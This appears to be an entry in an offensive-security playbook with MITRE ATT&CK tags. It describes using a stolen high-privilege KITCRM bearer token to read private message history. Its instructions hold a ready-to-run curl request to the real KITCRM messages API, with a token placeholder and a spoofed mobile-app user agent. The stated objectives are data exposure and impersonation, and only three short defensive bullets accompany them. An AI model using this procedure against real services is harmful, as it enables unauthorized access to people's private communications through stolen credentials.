---
tags:
  - data-exfiltration
  - kitcrm
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/get-kitcrm-messages]]'
platforms:
  - Web
techniques:
  - '[[Valid Accounts]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 8e7c3e1d-8257-4c43-bec9-2def4853444e
created_at: '2025-12-14T17:29:57.267Z'
updated_at: '2025-12-14T17:29:57.267Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Read-High-Priv-Messages

## Summary

This procedure uses the stolen high-privileged KITCRM token to retrieve private conversation history with KIT, exposing sensitive data.

## Description

With the Bearer token, GET /api/v2/messages bypasses controls to read chats. Target: KITCRM API. Prerequisites: High-priv token. Outcome: Full access to high-priv communications.

## Requirements

1. High-priv KITCRM Bearer token
2. HTTP client
3. Knowledge of conversation context

## Defense

Defensive measures and detection strategies:

- Token scoping to user ID
- Audit API access logs for anomalies
- Encrypt conversation data

## Objectives

1. Retrieve message history
2. Confirm sensitive data exposure
3. Validate impersonation

## Instructions

### Step 1: Send GET Request

**Context**: Use token to fetch messages.

**Command** ([[commands/get-kitcrm-messages]]):
```bash
curl -X GET "https://www.kitcrm.com/api/v2/messages" \
  -H "Authorization: Bearer HIGH_PRIV_TOKEN" \
  -H "User-Agent: Shopify Ping/2.5.4 (com.shopify.ping; build:3006; iOS 13.1.1) Alamofire/4.8.2" \
  -H "Accept: application/json"
```

> Expected output: JSON with message array, including private chats.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Valid Accounts]]

### Sub-Techniques


## Commands Used

- [[commands/get-kitcrm-messages]]

## Tools Used


## Tags

- [[data-exfiltration]]
- [[kitcrm]]
